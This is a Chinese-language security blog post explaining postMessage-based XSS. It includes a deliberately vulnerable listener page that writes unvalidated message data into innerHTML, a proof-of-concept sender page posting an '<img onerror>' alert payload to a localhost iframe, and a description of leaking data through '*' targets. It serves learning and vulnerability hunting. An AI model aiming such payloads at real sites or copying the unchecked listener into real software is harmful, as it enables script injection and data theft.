---
title: XSS漏洞 | postMessage类型笔记
url: https://www.svenbeast.com/post/o2xpyWshj/
source: 攻城肾透shi | sv3nbeast
date: 2023-01-31
fetch_date: 2025-10-04T05:11:35.321398
---

# XSS漏洞 | postMessage类型笔记

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)
[ ]

[攻城肾透shi | sv3nbeast](https://www.svenbeast.com)

Dark

\u6697\u9ED1

☰ Menu

☰ 菜单

[首页](/)
[📃文章列表](/posts)
[📖归档](/archives)
[🏷️标签](/tags)
[🔥关于](/post/about)

# XSS漏洞 | postMessage类型笔记

Author:
[斯文](/)

Date: 2023-01-30
Reading Time:3.8 mins
words:924

Category:
[XSS](https://www.svenbeast.com/tag/B2e6dlVTK/)
[学习](https://www.svenbeast.com/tag/IVn8EkeWs/)

share:

作者:
[斯文](/)
日期: 2023-01-30
阅读时间:3.8 分钟
字数:924
分类:
[XSS](https://www.svenbeast.com/tag/B2e6dlVTK/)
[学习](https://www.svenbeast.com/tag/IVn8EkeWs/)

分享:

### 0x01 postMessage是what?

postMessage API 是在 HTML5 中引入的通信方法，可以在标签中实现跨域通信。

简单来说就是两个网页窗口进行通信的方法。

![image-20230129153750345](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301291537439.png)

### 0x02 如何工作

* A页面: 一个带有 `接收postMessages通信`的测试html网页 ==> 相等于一个正常网站页面

```
<!-- 假如这是一个正常系统的.html -->
<head><meta charset="UTF-8"></head>

<div id="receiveMessage">
Hello World!
</div>

<script>
var test = "flag{123456}";
window.onload = function() {
    window.addEventListener('message', function (e) {  // 监听 message 事件
        // alert(e.origin);
        document.getElementById('receiveMessage').innerHTML = "从"+ e.origin +"收到消息： " + e.data;
    });
}
</script>
```

* B页面: 一个带有 `使用postMessages发送通信`的测试html网页 ==> 相等于一个攻击页面

```
<!-- POC.html -->
<title>Postmessage PoC</title>
<script>
  function pocFrame(win) {
    let msg = "hello world!";

    win.postMessage(msg, '*');
  }
</script>
<iframe src="http://127.0.0.1:9000/listen.html" onload="pocFrame(this.contentWindow)"></iframe>
```

#### 正常的运行流程

A页面持续监听通信，当访问B页面的时候运行js代码，向A页面发送通信，A页面接受信息然后对接受内容进行处理

应用场景: 一个网站实时监听，另一个网页某项运行流程结束后发送进度通知到监听的网页，后续如何xxx...

![image-20230130111359274](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301301115198.png)

### 0x03 如何变成漏洞

* 携带payload的poc.html

```
<!-- POC.html -->
<title>Postmessage PoC</title>
<script>
  function pocFrame(win) {
    let msg = "hello world! <img src=x onerror=alert(test)>";

    win.postMessage(msg, '*');
  }
</script>
<iframe src="http://127.0.0.1:9000/listen.html" onload="pocFrame(this.contentWindow)"></iframe>
```

![image-20230130112309337](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301301123373.png)

#### 产生漏洞原因

* 消息接收方没有对发送方的身份进行验证，导致可以自定义发送方网页

  + 例如: `if (e.origin !== "https://www.freebuf.com")`
* 消息接收方对发送方发送的内容进行了展示处理，从而可以使用XSS payload进行截断

  + 例如: `document.getElementById('receiveMessage').innerHTML = "从"+ e.origin +"收到消息： " + e.data;`

#### 利用过程

和反射型xss类似，用户在访问目标网站的时候，打开了攻击者提供的url，url是携带xss payload的poc.html，导致在目标网站执行了js代码。

#### 其他形式漏洞

上面展示的是接收方没有对发送身份验证，在对接收的消息进行处理后被xss payload截断导致存在xss漏洞

* 接收方是正常系统 => 发送方是恶意html

那么这样就还会有另外一种形式的漏洞，发送方没有设置接收方的身份，例如 `xxx.postMessage(msg,'*');`

\*号代表对接收方的窗口没有限制，只要你设置了监听(addEventListener)都可以接收到，那么如果正常系统在发送的时候就是如此设置，而刚好发送内容是一些敏感的信息，如账号密码的hash，那么你通过设置了监听当做接收方的恶意html，用户浏览正常系统时，然后在打开你的html后你就可以获得其正常网站的发送内容

* 发送方是正常系统 => 接收方是恶意html

### 0x04 挖掘方法

通过postMessage方法的关键字进行定位功能点，通过debug代码寻找触发点，从而获得漏洞，可以使用burp的插件J2EEScan辅助寻找使用相应功能的js文件，如何扩展延伸的进行挖掘对于我来说是一个有待开发的过程，目前我本人对此漏洞的经验并不足以帮我找到更好的自动化挖掘办法ing，

![1621219923545111](https://fastly.jsdelivr.net/gh/Ru1e/blogImage@main/images/202301301454558.gif)

* + - [0x01 postMessage是what?](#0x01-postmessage%E6%98%AFwhat)
    - [0x02 如何工作](#0x02-%E5%A6%82%E4%BD%95%E5%B7%A5%E4%BD%9C)
      * [正常的运行流程](#%E6%AD%A3%E5%B8%B8%E7%9A%84%E8%BF%90%E8%A1%8C%E6%B5%81%E7%A8%8B)
    - [0x03 如何变成漏洞](#0x03-%E5%A6%82%E4%BD%95%E5%8F%98%E6%88%90%E6%BC%8F%E6%B4%9E)
      * [产生漏洞原因](#%E4%BA%A7%E7%94%9F%E6%BC%8F%E6%B4%9E%E5%8E%9F%E5%9B%A0)
      * [利用过程](#%E5%88%A9%E7%94%A8%E8%BF%87%E7%A8%8B)
      * [其他形式漏洞](#%E5%85%B6%E4%BB%96%E5%BD%A2%E5%BC%8F%E6%BC%8F%E6%B4%9E)
    - [0x04 挖掘方法](#0x04-%E6%8C%96%E6%8E%98%E6%96%B9%E6%B3%95)

Author:
斯文

Permalink:
<https://www.svenbeast.com/post/o2xpyWshj/>

License:
MIT License

作   者:
斯文

永久链接:
<https://www.svenbeast.com/post/o2xpyWshj/>

协   议:
MIT License

Tag(s):

[# XSS](https://www.svenbeast.com/tag/B2e6dlVTK/)
[# 学习](https://www.svenbeast.com/tag/IVn8EkeWs/)

back

标签:

[# XSS](https://www.svenbeast.com/tag/B2e6dlVTK/)
[# 学习](https://www.svenbeast.com/tag/IVn8EkeWs/)

返回

[MinIO未授权信息泄露（CVE-2023-28432）](https://www.svenbeast.com/post/_sKzg-nS0/)
[针对"红队人员"的Github项目投毒发现及分析](https://www.svenbeast.com/post/ZVscVsf50/)

赏  ![support](https://www.svenbeast.com/media/images/alipay.png)**支付宝**   ![support](https://www.svenbeast.com/media/images/wechat.png)**微信**

[京ICP备19028185号](http://beian.miit.gov.cn/)

攻城肾透shi | sv3nbeast ©Copyright
 ![dandan](https://i.loli.net/2020/03/31/kG71rUoEW5YQq4h.gif)

/\*
\*/

召唤伊斯特瓦尔